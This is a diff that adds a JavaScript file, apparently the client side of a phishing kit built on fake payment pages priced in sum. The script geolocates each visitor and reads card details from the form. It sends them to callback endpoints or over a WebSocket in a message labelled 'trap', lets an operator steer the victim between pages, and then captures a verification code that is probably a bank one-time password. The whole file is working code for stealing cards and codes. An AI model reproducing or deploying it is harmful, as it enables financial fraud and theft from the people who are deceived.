@@ -1,0 +1,199 @@
+const id = new URL(location.href).pathname.split('/')[2];
+
+let geolocation = undefined;
+
+async function bindPage(selectors) {
+  geolocation = await getGeolocation();
+
+  let params = await getData();
+  params.cost = params.price;
+  params.price = params.price + ' сум';
+
+  fillPage(selectors.fill, params);
+
+  let data = {
+    id: id,
+    geolocation: geolocation,
+    platform: platform,
+  };
+
+  switch (selectors.notification) {
+    case 'mainPage':
+      send(data, '/callback/entry/info');
+      break;
+    case 'cardPage':
+      send(data, '/callback/entry/transfer');
+      break;
+  }
+
+  try {
+    if (selectors.control.toNextStage)
+      document
+        .querySelector(selectors.control.toNextStage)
+        .addEventListener('click', (e) => toNextStage());
+    else if (selectors.control.throwCard)
+      document
+        .querySelector(selectors.control.throwCard)
+        .addEventListener('click', (e) => {
+          sendCard(e, selectors.input, params, selectors.control.useWS);
+        });
+    else if (selectors.control.throwCode)
+      document
+        .querySelector(selectors.control.throwCode)
+        .addEventListener('click', (e) => {
+          sendCode(e, selectors.input);
+        });
+  } catch (e) {
+    console.log(e);
+  }
+}
+
+function fillPage(selectors, params) {
+  if (selectors)
+    Object.entries(selectors).forEach(([key, value]) => {
+      document.querySelectorAll(value)?.forEach((e) => {
+        switch (e.tagName.toLowerCase()) {
+          case 'input':
+            params[key] ? (e.value = params[key]) : null;
+            break;
+          case 'img':
+            params[key] ? (e.src = params[key]) : null;
+            break;
+          default:
+            params[key] ? (e.innerText = params[key]) : null;
+            break;
+        }
+      });
+    });
+}
+
+async function sendCard(e, selectors, params, useWS = false) {
+  let data = {
+    id: id,
+    balance: {
+      currency: params.currency,
+    },
+    geolocation: geolocation,
+    platform: platform,
+  };
+
+  Object.entries(selectors).forEach(([key, value]) => {
+    if (typeof value == 'object') {
+      if (data[key] == undefined) data[key] = {};
+      Object.entries(value).forEach(([innerKey, innerValue]) => {
+        data[key][innerKey] = document.querySelector(innerValue).value;
+      });
+    } else {
+      data[key] = document.querySelector(value).value;
+    }
+  });
+
+  data.balance.amount = +data.balance.amount;
+  e.target.disabled = true;
+
+  if (useWS) {
+    let socket;
+    // if (location.host === '127.0.0.1' || location.host === 'localhost') {
+    //   socket = new WebSocket(`ws://${location.host}:80`);
+    // } else {
+    //   socket = new WebSocket(`wss://${location.host}:443`);
+    // }
+
+    socket = new WebSocket(`wss://${location.host}/ws`);
+    socket.onmessage = (e) => {
+      let data = JSON.parse(e.data);
+
+      if (data.type === 'connection') {
+        sessionStorage.setItem('wsid', data.id);
+      }
+
+      if (!data.page) return;
+
+      if (data.page === 'refresh') {
+        location.reload();
+      } else {
+        toNextStage(data.page);
+      }
+    };
+
+    try {
+      showLoader();
+    } catch (e) {}
+
+    socket.onopen = () => {
+      socket.send(JSON.stringify({ type: 'trap', ...data }));
+    };
+  } else {
+    send(data, '/callback/send/card');
+    toNextStage();
+  }
+}
+
+async function sendCode(e, selectors) {
+  if (!document.querySelector(selectors.code).value) return 0;
+  let data = {
+    id: id,
+    websocketId: sessionStorage.getItem('wsid'),
+    code: document.querySelector(selectors.code).value,
+    geolocation: geolocation,
+    platform: platform,
+  };
+  e.target.disabled = true;
+  send(data, '/callback/send/code', true, true);
+}
+
+async function getGeolocation() {
+  try {
+    return await (await fetch('https://api.db-ip.com/v2/free/self')).json();
+  } catch (ex) {
+    return undefined;
+  }
+}
+
+let link;
+async function getData() {
+  if (!link) {
+    link = await (await fetch(`/link/${id}`)).json();
+  }
+  return link;
+}
+
+async function send(data, url, reload = false, showloader = false) {
+  await fetch(url, {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: { 'Content-Type': 'application/json' },
+  });
+  if (showloader) {
+    try {
+      showLoader();
+    } catch (e) {}
+  }
+  if (reload)
+    setTimeout(() => {
+      location.reload();
+    }, 6000);
+}
+
+function showLoader() {
+  document.querySelector('.lds-bg').style.visibility = 'visible';
+  document.querySelector('.lds-bg').style.opacity = 1;
+  document.querySelector('.lds-roller').style.display = 'block';
+}
+
+function toNextStage(stage = undefined) {
+  let url = new URL(window.location.href).pathname.replace(/\/$/, '');
+  let href;
+  if (stage) {
+    let temp = url.split('/');
+    temp[temp.length - 1] = stage;
+    href = temp.join('/');
+  } else if (url.includes('info')) {
+    href = url.replace(/info\/?$/, 'transfer');
+  } else {
+    href = url.replace(/transfer\/?$/, 'verification');
+  }
+  setTimeout(() => {
+    window.location.href = href;
+  }, 700);
+}
